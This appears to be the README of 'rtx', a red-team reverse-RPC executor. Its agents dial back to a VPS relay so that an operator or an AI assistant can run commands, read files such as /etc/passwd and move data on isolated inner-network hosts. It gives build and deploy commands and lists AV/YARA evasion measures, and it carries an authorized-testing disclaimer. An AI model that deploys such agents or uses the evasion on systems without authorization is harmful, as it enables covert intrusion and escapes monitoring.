# rtx — Reverse RPC Remote Executor

A **reverse-RPC remote executor** that lets your local AI / terminal operate on inner-network / isolated target machines (reachable only via deployed agents) as if they were local — run commands, read/write files, transfer data.

> ## ⚠️ Disclaimer
>
> This tool is **for authorized security testing / red-team exercises / CTF competitions / defensive security research and learning ONLY**.
> You must:
> - Obtain **explicit written authorization** from the target system owner beforehand;
> - Strictly comply with the authorized scope and applicable laws and regulations;
> - Bear full responsibility for any direct or indirect consequences of using this tool.
>
> The author is not responsible for any unauthorized use, misuse, or illegal activity. Do not use this tool for any unlawful purpose.
> If you do not agree with these terms, do not download, use, or distribute this tool.

## What problem does it solve?

When attacking multi-layer networks / isolated segments, your local machine often cannot reach the target directly — only already-deployed inner-network machines (jump hosts) can. The traditional approach is manually chaining `proxychains`, uploading tools, and shuttling files back and forth. rtx turns "execute on a remote machine" into a first-class capability:

```
Local (AI / brain)                VPS (relay server)               Inner-network target (agent)
  ├─ SSH tunnel → control API      ├─ accepts agent callbacks      ├─ reverse connection
  └─ rtxctl / rtx_* tools ──────▶  └─ task routing ──────────────▶ └─ native command execution
```

**Design highlights**:
- **Brain outside, executor inside**: API keys / model inference never land on the inner network; agents don't need outbound access to model APIs
- **Executor is a 3MB static binary**: pure Go standard library (zero third-party deps), cross-platform (Linux / Windows / macOS / ARM)
- **Reverse RPC**: agents dial out, punching through NAT and multi-hop tunnels, with automatic reconnection (random jitter)
- **Seamless AI integration**: point your AI's execution backend at an agent — the AI transparently executes on the target machine

## Components

| Component | Description |
|---|---|
| `agent` | Executor: dials back to server, handles exec/read/write/list/info/upload/download/kill |
| `server` | Controller: agent registry + control HTTP API + task routing |
| `rtx` | CLI: dispatch tasks through the control API |
| `rtxctl` | Convenience wrapper: token management, default agent, enter/exit/connect (TUI node picker) |
| `rtx_ui.py` | Node connection picker (VS Code Remote-style TUI) |
| `rtx_mcp_server.py` | Claude Code / MCP client tools (rtx_ls/rtx_enter/rtx_exec/...) |

## Quick start

```bash
# Build (pure standard library, no third-party deps)
go build -ldflags="-s -w" -trimpath -o bin/server ./cmd/server
go build -ldflags="-s -w" -trimpath -o bin/rtx ./cmd/rtx
CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build -ldflags="-s -w" -trimpath -o bin/agent-linux-amd64 ./cmd/agent

# 1. Start server on a public VPS (relay controller)
#    :9000 accepts agent callbacks (public — open in cloud security group); control API binds 127.0.0.1 only
./server -l :9000 -t <strong-random-token> --ctrl 127.0.0.1:9001

# 2. Local tunnel to the control API
ssh -N -f -L 9001:127.0.0.1:9001 root@<vps>

# 3. Deploy agent on the inner-network machine (zero-dependency, upload and run; see bin/ for platforms)
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <unique-host-name> -q

# TLS channel (v1.1, recommended when agents dial the public server directly):
#   add -tls to server (auto-generates cert & prints pin fp); agent dials with -tls -pin <fp>
./server -l :9000 -t <token> --ctrl 127.0.0.1:9001 -tls
./agent-linux-amd64 -c <vps>:9000 -t <token> -i <name> -tls -pin <server-fp>

# 4. Operate locally (rtxctl wraps token / default agent)
rtxctl connect          # TUI picker → enter an execution environment
rtxctl ls               # list online agents
rtxctl exec -cmd "whoami"
rtxctl read -path /etc/passwd
rtxctl upload -path /tmp/x -file ./local
```

## Remote reachability scenarios

- Local machine can't reach the target but an online agent can → deploy the agent on the reachable host; all AI operations are tunneled there
- Multi-layer inner networks → agents dial back via tunnel port-forwarding / SOCKS5 (`-proxy`)
- Seamless AI integration → Claude Code MCP (`rtx_mcp_server.py`) or point your AI tool backend at an agent

## Build artifacts

~3MB per platform: darwin / linux-amd64 / linux-arm64 / windows-amd64 / windows-arm64
(`-ldflags="-s -w"` + CGO=0 + pure standard library)

## Security

- Control API binds 127.0.0.1 only (accessed locally via SSH tunnel)
- Agent registration requires token authentication
- **TLS channel (v1.1)**: server `-tls` self-signed cert + agent `-tls -pin <fp>` certificate pinning
- **Static hardening (v1.1)**: neutral module path, XOR-obfuscated key strings, silenced help text
- Operational note: on EDR-monitored hosts, deploy agents through legitimate channels; kill and clean up residuals afterwards

## Changelog

### v1.1 (2026-09)
- **TLS channel**: server `-tls` auto-generates a self-signed cert and prints its fingerprint (`pin(fp)`); agent dials with `-tls -pin <fp>` (certificate pinning against MITM/sniffing). Recommended when agents connect to the public server directly.
- **Static hardening** (reduce AV/YARA signature surface):
  - neutralized Go module path (no project identifier in binaries)
  - XOR-obfuscated key strings (shell path / error strings / protocol markers), decrypted at runtime
  - silenced flag help text
- **Docs**: added `OPSEC-EVASION.md` (evasion playbook), `README_EN.md`

### v1.0 (initial)
- Reverse-RPC executor: agent / server / rtx CLI / rtxctl / rtx_ui (TUI node picker)
- Multi-platform static binaries (linux/windows/darwin, amd64/arm64)

## Credits

- Thanks to [lanyi1998](https://github.com/lanyi1998) — the connection-picker UI of `rtxctl connect` is inspired by his [pi-remote](https://github.com/lanyi1998/pi-remote) project (the "Saved remote connections" interaction paradigm).

## License

MIT
